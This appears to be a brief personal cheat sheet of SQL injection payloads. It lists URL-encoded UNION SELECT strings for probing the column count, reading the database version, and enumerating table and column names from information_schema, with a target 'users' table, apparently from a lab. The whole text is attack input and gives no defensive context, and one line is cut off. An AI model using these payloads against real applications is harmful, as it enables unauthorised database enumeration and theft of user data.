```
'UNION+SELECT+NULL,NULL,NULL--'
'UNION+SELECT+a,NULL,NULL,NULL
'UNION+SELECT+@@version
'U
```

```
get all the tables from the database
SELECT * FROM information_schema.tables
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

get all the columns from a specific table
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

```